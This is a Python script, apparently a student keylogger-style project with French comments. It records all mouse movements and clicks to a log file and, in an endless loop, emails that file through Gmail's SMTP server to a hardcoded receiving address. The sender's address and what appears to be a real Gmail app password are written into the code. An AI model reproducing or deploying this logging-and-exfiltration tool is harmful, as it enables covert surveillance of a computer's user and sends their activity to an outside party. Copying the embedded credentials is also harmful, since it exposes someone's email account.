import logging
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from pynput import mouse
import time

# Configure le fichier de log et le crée dès le lancement du programme
logging.basicConfig(
    filename="mouse.txt",
    filemode='w',
    datefmt='%I:%M:%S %p',
    format='%(asctime)s - %(message)s',
    level=logging.DEBUG
)
logging.debug("Mouse tracking started.")  # Message initial pour marquer le début de la traçabilité

previous_position = (0, 0)  # Initialisation de la position précédente pour le calcul de la direction


def on_mouse_move(mouse_position_x, mouse_position_y):
    global previous_position
    x_prev, y_prev = previous_position
    direction = ""

    if mouse_position_x > x_prev:
        direction += "right "
    elif mouse_position_x < x_prev:
        direction += "left "
    if mouse_position_y > y_prev:
        direction += "down"
    elif mouse_position_y < y_prev:
        direction += "up"

    previous_position = (mouse_position_x, mouse_position_y)  # Mise à jour de la position

    message = f"The mouse has moved to ({mouse_position_x}, {mouse_position_y}) - Direction: {direction.strip()}"
    print(message)
    logging.debug(message)


def on_mouse_click(mouse_position_x, mouse_position_y, button, is_pressed):
    if button == mouse.Button.middle and is_pressed:
        message = "Middle mouse button pressed! It's special!"
    else:
        message = f"Mouse button pressed: {button} | Is pressed: {is_pressed}"

    print(message)
    logging.debug(message)


# Fonction pour envoyer un email
def sendMail():
    port = 465
    smtp_server = "smtp.gmail.com"
    sender_email = "amazonoussama640@gmail.com"  # adresse mail bidon d'où le mail va être envoyé
    receiver_email = "oussamaau123@gmail.com"  # adresse mail sur laquelle on veut recevoir le mail
    password = "tdcf hoql nrco flxv"
    objet = "Fichier du keylog"
    corps = "Envoi du fichier de la souris"

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = objet

    message.attach(MIMEText(corps, "plain"))

    filename = "mouse.txt"

    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )
    message.attach(part)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())


while True:
    print("Starting the mouse listener, will be active for 5 seconds...")
    mouse_listener = mouse.Listener(
        on_move=on_mouse_move,
        on_click=on_mouse_click
    )
    mouse_listener.start()

    time.sleep(5)

    print("Time's up, stopping the mouse listener")
    mouse_listener.stop()
    mouse_listener.join()

    sendMail()
